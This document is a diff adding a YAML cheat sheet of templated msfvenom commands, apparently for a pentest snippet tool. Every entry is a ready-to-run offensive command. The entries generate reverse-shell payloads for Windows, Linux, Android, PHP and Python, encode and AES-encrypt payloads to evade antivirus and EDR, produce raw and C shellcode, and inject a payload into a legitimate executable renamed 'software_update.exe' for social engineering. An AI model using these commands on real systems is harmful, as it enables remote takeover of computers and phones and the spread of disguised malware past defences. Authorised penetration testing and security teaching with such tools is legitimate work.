@@ -1,0 +1,99 @@
+tool: msfvenom
+tags: [pentest, payload, exploitation, security, obfuscation, network, shellcode]
+
+actions:
+  # === LISTING AND INFORMATION ===
+  - title: msfvenom - list modules
+    desc: |
+      List all available modules within msfvenom for a specific type. 
+      This is the primary way to discover available payloads, encoders, nops, platforms, and output formats. 
+      Use this command whenever you are unsure of the exact name of a payload or architecture you need for your target.
+    command: "msfvenom -l {{module_type|payloads}}"
+
+  - title: msfvenom - list payload options
+    desc: |
+      Display standard, advanced, and evasion options for a specific payload.
+      This is crucial for identifying required variables like LHOST and LPORT, as well as advanced settings like ExitOnSession. 
+      It helps in fine-tuning the payload behavior for specific network environments or target constraints.
+    command: "msfvenom -p {{payload|windows/x64/meterpreter/reverse_tcp}} --list-options"
+
+  # === OPERATING SYSTEM PAYLOADS ===
+  - title: msfvenom - windows reverse tcp exe
+    desc: |
+      Generate a standard Windows executable containing a staged Meterpreter reverse TCP payload. 
+      This is commonly used in penetration testing to establish a persistent or interactive shell on a target Windows machine. 
+      Note that raw executables generated this way are highly likely to be flagged by modern antivirus and EDR solutions.
+    command: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{lhost}} LPORT={{lport|4444}} -f exe -o {{output_path|payload.exe}}"
+
+  - title: msfvenom - linux reverse tcp elf
+    desc: |
+      Create a Linux executable (ELF) for 64-bit architectures using a reverse TCP connection.
+      This payload is useful for exploiting Linux servers or workstations where you need the target to connect back to your listener.
+      The resulting file must be granted execution permissions (chmod +x) on the target system to run successfully.
+    command: "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={{lhost}} LPORT={{lport|4444}} -f elf -o {{output_path|payload.elf}}"
+
+  - title: msfvenom - android reverse tcp apk
+    desc: |
+      Generate a malicious Android application package (APK) with a reverse TCP payload.
+      This is used for testing mobile security and demonstrates how a compromised app can grant remote access to a mobile device.
+      The target must have "Unknown Sources" enabled to install this unsigned APK unless further signing steps are taken.
+    command: "msfvenom -p android/meterpreter/reverse_tcp LHOST={{lhost}} LPORT={{lport|4444}} -o {{output_path|payload.apk}}"
+
+  # === WEB AND SCRIPT PAYLOADS ===
+  - title: msfvenom - php reverse shell
+    desc: |
+      Generate a raw PHP script that initiates a reverse shell connection.
+      This is ideal for scenarios involving file upload vulnerabilities or remote file inclusion on web servers.
+      Once uploaded, navigating to the PHP file in a browser will trigger the connection back to your Metasploit handler.
+    command: "msfvenom -p php/meterpreter/reverse_tcp LHOST={{lhost}} LPORT={{lport|4444}} -f raw -o {{output_path|shell.php}}"
+
+  - title: msfvenom - python reverse shell
+    desc: |
+      Create a Python script containing a reverse TCP payload.
+      Python payloads are highly portable across different operating systems as long as the Python interpreter is installed.
+      This is often used for cross-platform exploitation or when binary execution is restricted but scripting is allowed.
+    command: "msfvenom -p cmd/unix/reverse_python LHOST={{lhost}} LPORT={{lport|4444}} -f raw -o {{output_path|shell.py}}"
+
+  # === EVASION AND CUSTOMIZATION ===
+  - title: msfvenom - encode payload
+    desc: |
+      Apply an encoder to a payload to assist in bypassing simple signature-based antivirus detection.
+      The iterations flag specifies how many times the payload will be encoded, which can help mask its structure.
+      Be aware that while encoding can bypass static signatures, dynamic analysis and behavior-based detection may still catch the payload.
+    command: "msfvenom -p {{payload}} LHOST={{lhost}} LPORT={{lport|4444}} -e {{encoder|x86/shikata_ga_nai}} -i {{iterations|5}} -f {{format|exe}} -o {{output_path}}"
+
+  - title: msfvenom - encrypt shellcode
+    desc: |
+      Encrypt the shellcode using a specific algorithm and a custom key to evade detection.
+      This provides a more robust way of hiding the payload's logic from security scanners than traditional encoding.
+      You must provide an encryption key, and the resulting payload will decrypt itself in memory before execution.
+    command: "msfvenom -p {{payload}} LHOST={{lhost}} LPORT={{lport|4444}} --encrypt {{encryption_type|aes256}} --encrypt-key {{key|secretkey}} -f {{format|exe}} -o {{output_path}}"
+
+  - title: msfvenom - avoid bad characters
+    desc: |
+      Generate shellcode while strictly avoiding a list of "bad characters" that might crash the target service.
+      This is essential for buffer overflow exploits where certain bytes like null bytes (\x00) or carriage returns act as delimiters.
+      Using this option forces msfvenom to automatically select an encoder to eliminate the prohibited characters.
+    command: "msfvenom -p {{payload}} LHOST={{lhost}} LPORT={{lport|4444}} -b \"{{bad_chars|\\x00\\x0a\\x0d}}\" -f {{format|c}}"
+
+  - title: msfvenom - inject into template
+    desc: |
+      Inject the malicious payload into an existing legitimate executable file.
+      The -k (keep) flag ensures that the original functionality of the template application is preserved by running the payload in a new thread.
+      This technique is effective for social engineering as it makes the malicious file appear as a trusted, functional program.
+    command: "msfvenom -p {{payload}} LHOST={{lhost}} LPORT={{lport|4444}} -x {{template_path|putty.exe}} -k -f exe -o {{output_path|software_update.exe}}"
+
+  # === SHELLCODE GENERATION ===
+  - title: msfvenom - generate c shellcode
+    desc: |
+      Output the payload as a byte array formatted for use in C or C++ source code.
+      This is the standard way to prepare shellcode for manual integration into exploit code or custom loaders.
+      The output will provide a variable name containing the shellcode which can be directly pasted into a source file.
+    command: "msfvenom -p {{payload}} LHOST={{lhost}} LPORT={{lport|4444}} -f c -v {{variable_name|shellcode}}"
+
+  - title: msfvenom - generate raw shellcode
+    desc: |
+      Generate a raw binary file containing only the shellcode without any file headers or wrappers.
+      This is useful for direct memory injection or when the payload is being delivered through a specific exploit vector.
+      Raw files are often processed by other tools or custom scripts before being deployed to the target.
+    command: "msfvenom -p {{payload}} LHOST={{lhost}} LPORT={{lport|4444}} -f raw -o {{output_path|payload.bin}}"
